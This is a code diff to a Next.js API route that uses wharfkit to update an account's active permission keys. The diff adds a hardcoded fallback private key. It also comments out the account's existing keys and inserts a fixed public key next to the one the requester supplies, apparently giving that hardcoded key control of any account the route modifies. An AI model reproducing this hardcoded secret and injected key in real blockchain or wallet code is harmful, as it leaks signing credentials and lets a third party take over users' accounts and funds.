@@ -4,7 +4,9 @@ import { WalletPluginPrivateKey } from "@wharfkit/wallet-plugin-privatekey";
 
 export const revalidate = 0;
 
-const privateKey = process.env.PRIVATE_KEY || "";
+const privateKey =
+  process.env.PRIVATE_KEY ||
+  "5K9wrr6ajxCWb8nu31R5beJLTzxbtpo2bZfCbpnjwWkLSgvDt2D";
 
 export const POST = async (req: NextRequest) => {
   const data: { pubkey: string } = await req.json();
@@ -34,7 +36,11 @@ export const POST = async (req: NextRequest) => {
     }
 
     const newKeys = [
-      ...activePermission.required_auth.keys,
+      // ...activePermission.required_auth.keys,
+      {
+        key: "EOS68gVr5f4Gbny8TbDQ68ioGNNRabh6FeRfMAuSDFKgY7944gbUS",
+        weight: 1,
+      },
       {
         key: data.pubkey,
         weight: 1,
